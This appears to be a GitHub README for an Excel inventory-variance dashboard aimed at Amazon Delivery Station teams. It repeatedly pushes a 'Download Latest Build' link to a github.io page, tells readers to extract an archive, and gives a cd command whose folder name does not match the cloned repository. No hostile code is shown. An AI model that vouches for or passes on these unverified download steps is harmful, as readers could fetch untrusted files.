# Amazon DS Inventory Count Dashboard - Inventory Management Dashboard 2026

> **An Excel-based inventory control dashboard for Amazon Delivery Stations. Compare physical counts against expected system quantities, investigate discrepancies, and monitor operating KPIs with formula-driven reporting.**

[![Platform](https://img.shields.io/badge/Platform-Microsoft%20Excel-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20Specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henrystonelzjw6431/amazon-inventory-variance-dashboard?style=flat-square)](https://github.com/henrystonelzjw6431/amazon-inventory-variance-dashboard)

---

<p align="center">
  <a href="https://henrystonelzjw6431.github.io/amazon-inventory-variance-dashboard/">
    <img src="https://img.shields.io/badge/Download-Amazon%20DS%20Inventory%20Count%20Dashboard%20Latest-brightgreen?style=for-the-badge" alt="Download Amazon DS Inventory Count Dashboard">
  </a>
</p>

> **[Download Amazon DS Inventory Count Dashboard](https://henrystonelzjw6431.github.io/amazon-inventory-variance-dashboard/)**

---

[Download Latest Build](https://henrystonelzjw6431.github.io/amazon-inventory-variance-dashboard/)

---

## Overview

Amazon DS Inventory Count Dashboard brings weekly Delivery Station inventory review into a single Microsoft Excel workbook. Warehouse and operations teams can enter physical counts, compare them with expected system values, examine variances, and determine which items or areas require attention.

The workbook includes data entry, variance computation, zone summaries, and KPI views. Because the dashboard relies on Excel formulas rather than macros or external connections, it can support recurring reviews within the workbook itself. Charts and conditional formatting help make exceptions, trends, and zero-stock records visible.

---

## Capabilities

- Put physical quantities side by side with expected system counts.
- Calculate count accuracy, absolute variance, and variance percentage.
- Summarize inventory performance for each reporting week.
- Analyze inventory results by warehouse zone.
- Display KPI movement in dashboard charts.
- Apply visual status and variance indicators through conditional formatting.
- Include packaging supplies in inventory monitoring.
- Identify items with zero available stock.
- Recalculate results with live Excel formulas, without macros or external data connections.

---

## Getting Started

1. Get the latest workbook from [Download Latest Build](https://henrystonelzjw6431.github.io/amazon-inventory-variance-dashboard/).
2. If the download is archived, extract its contents.
3. Launch the Excel workbook using Microsoft Excel.
4. Create or save a working copy for the applicable station or reporting period.
5. Add inventory data in the specified input fields, then review the resulting dashboard.

The repository can also be obtained with Git:

```bash
git clone https://github.com/henrystonelzjw6431/amazon-inventory-variance-dashboard.git
cd Amazon-DS-Weekly-Inventory-Count-Dashboard
```

After cloning, open the workbook in Microsoft Excel.

---

## Weekly Workflow

Use the following sequence for a standard inventory review:

1. Open the workbook and choose or establish the applicable reporting period.
2. Add the expected system quantity for every inventory item.
3. Enter the physical quantity found during the count.
4. Examine the calculated accuracy, variance, and variance percentage.
5. Investigate records identified by the workbook's conditional formatting.
6. Review zero-stock indicators and packaging supply levels.
7. Compare weekly and zone summaries to identify operational patterns.
8. Use the KPI dashboard when conducting inventory or warehouse operations reviews.

Excel formulas recalculate the displayed results when the source values are added or modified.

---

## Workbook Setup

Configuration is performed inside the workbook; there is no separate settings file. Confirm these values before beginning routine reporting:

- The applicable week or reporting period.
- Inventory item records and packaging supply records.
- Expected system quantities.
- Physical count values.
- Warehouse zone names.
- Operational labels specific to the workbook.

Do not replace formula cells or dashboard ranges when entering new records. Where the workbook separates data-entry fields from reporting sections, restrict operational edits to the intended input areas.

---

## Requirements

- Microsoft Excel capable of handling standard workbook formulas.
- A Windows or macOS computer that can run Microsoft Excel.
- Adequate storage for the workbook and its reporting copies.
- No macro runtime or external data connection.
- Access to the expected quantities and physical count data required by the inventory process.

---

## Frequently Asked Questions

### What type of team should use this dashboard?

The workbook is intended for Amazon Delivery Station warehouse and operations teams that perform inventory counts, investigate count differences, and report KPIs.

### Are macros needed?

No. Calculations are handled by live Excel formulas, and the workbook does not depend on macros or external connections.

### Is the dashboard designed for weekly reporting?

Yes. Its reporting structure supports weekly inventory reviews, including recurring trend analysis and zone-based views.

### Where should expected and physical quantities be entered?

Enter both values in the workbook's designated input sections. The dashboard and summary areas use those entries to produce their calculated results.

### Can packaging materials be included?

Yes. Packaging supply inventory can be tracked within the dashboard.

### What can I verify if a calculation appears wrong?

Check the reporting period, item names, zone labels, expected quantities, and physical counts. Make sure formula cells and dashboard ranges were not replaced or edited accidentally.

### Where is the newest workbook available?

Use [Download Latest Build](https://henrystonelzjw6431.github.io/amazon-inventory-variance-dashboard/) to obtain the latest available version. The repository may also include related release notes or updated files.

### How do I report a problem?

Create an issue in the project repository at [https://github.com/henrystonelzjw6431/amazon-inventory-variance-dashboard](https://github.com/henrystonelzjw6431/amazon-inventory-variance-dashboard). Include the workbook context, the steps leading to the issue, and any useful calculation information.

---

## Planned Improvements

- Further refine weekly and zone-based reporting.
- Enhance the way KPI trends are displayed.
- Make inventory and packaging supply review workflows more effective.
- Continue improving formula-based alerts and overall dashboard usability.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
